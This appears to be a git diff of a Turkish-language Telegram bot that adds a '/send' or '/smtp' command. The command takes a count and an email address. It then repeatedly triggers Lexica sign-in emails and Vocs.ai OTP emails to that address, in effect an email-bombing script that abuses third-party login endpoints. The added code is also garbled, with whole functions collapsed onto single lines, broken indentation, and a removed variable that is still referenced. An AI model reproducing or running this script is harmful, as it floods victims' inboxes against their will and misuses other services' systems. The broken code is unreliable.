@@ -159,80 +159,57 @@ async def ping(client, message: Message):
 
 
 
-@Mukesh.on_message(filters.command(["send", "smtp"]))
-async def smtp_command_handler(client: Client, message: Message):
-    await message.reply("Kaç defa göndermek istiyorsun? (sayı yaz)")
-    Mukesh.add_handler(filters.text & filters.private, process_count, group=1)
+user_states = {}
 
-async def process_count(client: Client, message: Message):
+@Mukesh.on_message(filters.command(["send", "smtp"])) async def smtp_command_handler(client: Client, message: Message): user_states[message.chat.id] = {"step": "awaiting_count"} await message.reply("Kaç defa göndermek istiyorsun? (sayı yaz)")
+
+@Mukesh.on_message(filters.text & filters.private) async def handle_user_input(client: Client, message: Message): chat_id = message.chat.id if chat_id not in user_states: return  # bu kullanıcı smtp başlatmadı
+
+state = user_states[chat_id]
+
+# 1. adım: sayı girişi
+if state["step"] == "awaiting_count":
     try:
         count = int(message.text.strip())
-        data_store[message.chat.id] = {"count": count}
+        state["count"] = count
+        state["step"] = "awaiting_email"
         await message.reply("E-posta adresini gir:")
-        Mukesh.add_handler(filters.text & filters.private, process_email, group=2)
     except ValueError:
         await message.reply("Geçerli bir sayı gir.")
 
-async def process_email(client: Client, message: Message):
+# 2. adım: e-posta girişi
+elif state["step"] == "awaiting_email":
     email = message.text.strip()
-    chat_id = message.chat.id
-    if chat_id in data_store and "count" in data_store[chat_id]:
-        data_store[chat_id]["email"] = email
-        await message.reply(f"{email} kayıt edildi, başlıyorum...")
-        csrf_token, csrf_token0 = get_csrf_tokens()
-        if csrf_token and csrf_token0:
-            count = data_store[chat_id]["count"]
-            threading.Thread(target=send_emails, args=(csrf_token, csrf_token0, email, count, chat_id)).start()
-        else:
-            await message.reply("CSRF token alınamadı.")
+    state["email"] = email
+    await message.reply(f"{email} kayıt edildi, gönderim başlıyor...")
+    csrf_token, csrf_token0 = get_csrf_tokens()
+    if csrf_token and csrf_token0:
+        threading.Thread(target=send_emails, args=(csrf_token, csrf_token0, email, state["count"], chat_id)).start()
     else:
-        await message.reply("Önce kaç defa göndereceğini belirtmelisin.")
+        await message.reply("CSRF token alınamadı.")
+    del user_states[chat_id]
 
-def get_csrf_tokens():
-    url = "https://lexica.art/api/auth/csrf"
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Android)",
-    }
-    try:
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            data = response.json()
-            csrf_token = data.get("csrfToken")
-            csrf_token0 = response.cookies.get("__Host-next-auth.csrf-token")
-            return csrf_token, csrf_token0
-    except Exception as e:
-        print(f"Hata: {e}")
-    return None, None
+def get_csrf_tokens(): url = "https://lexica.art/api/auth/csrf" headers = { 'User-Agent': "Mozilla/5.0 (Android)", } try: response = requests.get(url, headers=headers) if response.status_code == 200: data = response.json() csrf_token = data.get("csrfToken") csrf_token0 = response.cookies.get("__Host-next-auth.csrf-token") return csrf_token, csrf_token0 except Exception as e: print(f"Hata: {e}") return None, None
 
-def send_email_request(csrf_token, csrf_token0, email):
-    url = "https://lexica.art/api/auth/signin/email"
-    payload = f"email={email}&redirect=false&callbackUrl=https%3A%2F%2Flexica.art%2Faccount&csrfToken={csrf_token}"
-    headers = {
-        'User-Agent': "Mozilla/5.0",
-        'Content-Type': "application/x-www-form-urlencoded",
-        'Cookie': f"__Host-next-auth.csrf-token={csrf_token0}; __Secure-next-auth.callback-url=https%3A%2F%2Flexica.art"
-    }
-    return requests.post(url, data=payload, headers=headers)
+def send_email_request(csrf_token, csrf_token0, email): url = "https://lexica.art/api/auth/signin/email" payload = f"email={email}&redirect=false&callbackUrl=https%3A%2F%2Flexica.art%2Faccount&csrfToken={csrf_token}" headers = { 'User-Agent': "Mozilla/5.0", 'Content-Type': "application/x-www-form-urlencoded", 'Cookie': f"__Host-next-auth.csrf-token={csrf_token0}; __Secure-next-auth.callback-url=https%3A%2F%2Flexica.art" } return requests.post(url, data=payload, headers=headers)
 
-def send_emails(csrf_token, csrf_token0, email, count, chat_id):
-    for i in range(count):
-        res1 = send_email_request(csrf_token, csrf_token0, email)
-        Mukesh.send_message(chat_id, f"Lexica Email {i+1} {'✅' if res1.status_code == 200 else f'❌ ({res1.status_code})'}")
-        
-        res2 = requests.post(
-            "https://backend.vocs.ai/api/user/sendotp",
-            headers={
-                'User-Agent': "Mozilla/5.0",
-                'Content-Type': "application/json",
-                'origin': "https://www.vocs.ai"
-            },
-            data=json.dumps({"email": email})
-        )
-        Mukesh.send_message(chat_id, f"Vocs OTP {i+1} {'✅' if res2.status_code == 200 else f'❌ ({res2.status_code})'}")
+def send_emails(csrf_token, csrf_token0, email, count, chat_id): for i in range(count): res1 = send_email_request(csrf_token, csrf_token0, email) Mukesh.send_message(chat_id, f"Lexica Email {i+1} {'✅' if res1.status_code == 200 else f'❌ ({res1.status_code})'}")
 
-    Mukesh.send_message(chat_id, "✅ İşlem tamamlandı.")
+res2 = requests.post(
+        "https://backend.vocs.ai/api/user/sendotp",
+        headers={
+            'User-Agent': "Mozilla/5.0",
+            'Content-Type': "application/json",
+            'origin': "https://www.vocs.ai"
+        },
+        data=json.dumps({"email": email})
+    )
+    Mukesh.send_message(chat_id, f"Vocs OTP {i+1} {'✅' if res2.status_code == 200 else f'❌ ({res2.status_code})'}")
 
-s = bytearray.fromhex("68 74 74 70 73 3A 2F 2F 67 69 74 68 75 62 2E 63 6F 6D 2F 4E 6F 6F 62 2D 6D 75 6B 65 73 68 2F 43 68 61 74 67 70 74 2D 62 6F 74").decode()
+Mukesh.send_message(chat_id, "✅ İşlem tamamlandı.")
+
+    
+            
 
 if SOURCE != s:
     print("So sad, you have changed source, change it back to ` https://github.com/Noob-mukesh/Chatgpt-bot `  else I won't work")
